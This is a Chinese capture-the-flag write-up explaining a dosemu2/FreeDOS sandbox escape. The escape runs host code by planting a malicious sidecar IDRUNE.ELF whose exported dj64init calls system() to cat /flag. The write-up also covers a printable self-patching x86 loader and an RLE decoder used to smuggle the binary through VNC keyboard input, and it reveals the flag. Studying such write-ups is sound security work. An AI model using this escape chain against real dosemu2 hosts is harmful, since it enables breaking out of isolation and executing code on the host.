# Farthest2026

## 题目简述

题目入口限制在 VNC 中的 FreeDOS/dosemu2 环境，看似只能操作 DOS。关键点是 dosemu2 默认启动 COMCOM64，而 COMCOM64/dj64 为支持 64 位程序会加载同名 `.ELF` sidecar；这个 ELF 的初始化函数在 Linux host 侧执行，因此可以从 DOS VM 边界逃逸到容器 host 并读取 `/flag`。

## 解题过程

进入 VNC 后能看到 FreeDOS/dosemu2。DOS 内部的普通 COM 程序即使可控，大部分中断和 syscall 也由 dosemu 接管，不能直接在外侧 Linux getshell。需要利用的是 COMCOM64/dj64 helper 的 ELF 加载流程。

dosemu2 中 `DOS_HELPER_ELFLOAD` 的关键流程可以概括为：

```text
elfload.com / elfload.s
  AL = DOS_HELPER_ELFLOAD
  int DOS_HELPER_INT
        |
        v
dosemu2 src/base/core/int.c
  case DOS_HELPER_ELFLOAD:
      do_elfload()
        |
        v
elf_thr()
  derive sidecar name: current COM basename + ".ELF"
  open sidecar ELF
  call registered dj64 loader
        |
        v
dj64dev stub
  parse ELF/stub format
  load sections
  return guest-side CS:EIP
        |
        v
dj64 ops
  djdev64_open()
  dlopen / dlmopen / emu_dlmopen(path)
  dlsym("dj64init_once")
  dlsym("dj64init")
  dlsym("dj64done")
```

这里的核心不是“DOS 里执行 ELF”，而是 dj64 sidecar 会被 host 侧 loader 打开，并调用导出的初始化函数。看到 `COMMAND.COM` 旁边有 `COMMAND.ELF` 时，就能推断同名 sidecar 的加载机制。利用时复制一个 COMCOM64 stub 为 `IDRUNE.COM`，再放置恶意 `IDRUNE.ELF`，运行 `IDRUNE` 即可触发 host 侧加载。

恶意 ELF 需要导出 dj64 入口函数：

```c
int dj64init_once(const void *api, int api_ver);
dj64cdispatch_t **dj64init(int handle, const void *ops, void *main_fn, int full);
void dj64done(int handle);
```

在 `dj64init()` 里执行显示 flag 的命令：

```c
system("DISPLAY=:1 /usr/bin/xterm -geometry 80x10+0+0 -hold -e /usr/bin/cat /flag &");
```

之后让进程保持 sleep，避免返回后 dosemu 崩溃或 xterm 还没来得及显示。

剩下的难点是传文件：题目没有 SSH、上传接口或 VNC 文件传输扩展，只能靠 DOS 控制台输入。`copy con file` 不是二进制信道，`NUL`、`Ctrl+Z`、CR/LF、高字节和长行都不可靠。稳定可用的是短 printable ASCII 行，因此传输链拆成三段：

```text
copy con H.COM
  -> 写入 printable self-patching 程序

H.COM
  -> 原地修补出真正的 hex decoder
  -> 读取 ASCII hex，写出 R.COM

R.COM
  -> 读取 RLE/hex 文本，写出 IDRUNE.ELF

copy e:command.com idrune.com
idrune
  -> COMCOM64/dj64 加载 IDRUNE.ELF
  -> host 侧 xterm 执行 cat /flag
```

`H.COM` 的目标是只由稳定 printable 字符组成，同时运行后能修补出二进制 decoder。做法是给每个目标字节找 printable placeholder 和一到两个 printable key：

```text
target = placeholder - key1 - key2 mod 256
```

例如：

```text
target 00: '!'(0x21) - '!'(0x21) = 0x00
target 1A: ';'(0x3b) - '!'(0x21) = 0x1a
target CD: '!'(0x21) - 'T'(0x54) = 0xcd mod 256
target FF: '#'(0x23) - '$'(0x24) = 0xff mod 256
```

patcher 使用的指令也必须是 printable，例如：

```text
h!![
  68 21 21 5b
  push 0x2121; pop bx

K
  4b
  dec bx

hA?Z
  68 41 ?? 5a
  push 0x??41; pop dx

A(wA
  41 28 77 41
  inc cx
  sub byte [bx+0x41], dh

C
  43
  inc bx
```

`[bx+0x41]` 中的 displacement 选 `0x41`，因为它也是字符 `A`，可以从键盘可靠输入。

`R.COM` 是第二阶段 decoder，支持一个极简 RLE，减少 VNC 输入量：

```text
HH       literal byte
GNNHH    repeat byte HH for NN times
!        end
```

ELF 中有大量 `00`、padding 和重复字段，用这个简单 RLE 就能把约 14KB 的 `IDRUNE.ELF` 压到约 6.6K 字符，足够通过 VNC 稳定输入。最后运行 `idrune` 后，xterm 中显示：

```text
ACTF{ba6k_t2_th3_ag1s_wIth0uT_a9ents_KeHo7P1oYx}
```

本地脚本输出 `spike = ...`、`money = ...`、`proof = ...`，生成的 proof 用于提交验证。

## 方法总结

- 核心技巧：利用 COMCOM64/dj64 的同名 sidecar ELF 加载机制，让 ELF 初始化函数在 host 侧执行。
- 识别信号：VNC/FreeDOS/dosemu 场景中出现 COMCOM64、`COMMAND.ELF`、dj64 helper 时，应检查 DOS helper 到 host loader 的边界。
- 复用要点：边界突破后，真正难点变成受限输入通道传二进制；可用 printable self-patcher 加 RLE decoder 把不可靠键盘输入变成稳定文件传输。
